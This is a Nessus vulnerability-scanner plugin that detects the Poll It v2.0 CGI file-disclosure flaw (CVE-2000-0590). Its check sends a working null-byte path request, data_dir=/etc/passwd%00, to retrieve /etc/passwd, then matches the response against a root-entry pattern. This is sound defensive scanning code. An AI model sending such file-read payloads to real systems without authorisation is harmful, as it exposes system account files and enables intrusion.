
#
# This script was written by Thomas Reinke <reinke@securityspace.com>
#
# See the Nessus Scripts License for details
#
# Changes by rd :
#    - attempt to read /etc/passwd
#    - script_id
#    - script_bugtraq_id(1431);
#

if(description)
{
 script_id(10459);
 script_bugtraq_id(1431);
 script_version ("$Revision: 1.21 $"); 
 script_cve_id("CVE-2000-0590");
 name["english"] = "Poll It v2.0 cgi";
 name["francais"] = "Poll It v2.0 cgi";
 script_name(english:name["english"], francais:name["francais"]);

 desc["english"] = "'Poll_It_SSI_v2.0.cgi' is installed. This CGI has
 a well known security flaw that lets an attacker retrieve any file from
 the remote system, e.g. /etc/passwd.

Solution:  remove 'Poll_It_SSI_v2.0.cgi' from /cgi-bin.

Risk factor : High";

desc["francais"] = "Le cgi 'Poll_It_SSI_v2.0.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à a un pirate de lire des
fichiers arbitraires, e.g. /etc/passwd.

Solution: retirez-le de /cgi-bin.

Facteur de risque : Sérieux";



 script_description(english:desc["english"], francais:desc["francais"]);

 summary["english"] = "Checks for the presence of /cgi-bin/pollit/Poll_It_SSI_v2.0.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/pollit/Poll_It_SSI_v2.0.cgi";
   
 script_summary(english:summary["english"], francais:summary["francais"]);

 script_category(ACT_GATHER_INFO);


 script_copyright(english:"This script is Copyright (C) 2000 Thomas Reinke",
         francais:"Ce script est Copyright (C) 2000 Thomas Reinke");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 
 exit(0);
}	  
  
#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 foreach dir (cgi_dirs())
 {
 req = string(dir, "/pollit/Poll_It_SSI_v2.0.cgi?data_dir=/etc/passwd%00");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   security_hole(port);
   exit(0);
  }
 }
}
